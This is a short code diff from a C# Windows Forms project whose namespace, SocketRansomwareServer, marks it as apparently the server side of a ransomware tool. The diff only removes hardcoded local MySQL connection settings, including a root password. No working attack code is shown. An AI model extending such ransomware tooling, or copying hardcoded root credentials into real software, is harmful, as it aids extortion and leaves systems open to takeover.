@@ -19,13 +19,6 @@ namespace SocketRansomwareServer
 {
     public partial class Form1 : Form
     {
-        string _server = "localhost";
-        int _port = 3306;
-        string _database = "client";
-        string _id = "root";
-        string _pw = "1111";
-        string _connectionAddress = "";
-
         public Form1()
         {
             InitializeComponent();
